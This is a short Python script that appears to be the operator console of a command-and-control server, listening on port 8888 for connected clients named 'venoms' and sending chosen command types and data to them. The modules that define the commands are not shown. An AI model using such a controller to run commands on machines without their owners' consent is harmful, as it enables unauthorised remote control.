from venom_handler import VenomHandler
from server import Server
from threading import Thread
from commands import Command, CommandType


def main():
    venom_handler = VenomHandler()
    server = Server('0.0.0.0', 8888, venom_handler)
    Thread(target=server.accept_clients, ).start()
    while True:
        print(f"Available venoms: {[venom for venom in venom_handler.venoms]}")
        venom_id = input("id: ")
        command_type = CommandType[input(f"Command type: {list(CommandType)}\n")].value
        data = input("Data: ").encode()
        command = Command(len(data), command_type, data)
        venom_handler.send_command(venom_id, command)


if __name__ == '__main__':
    main()
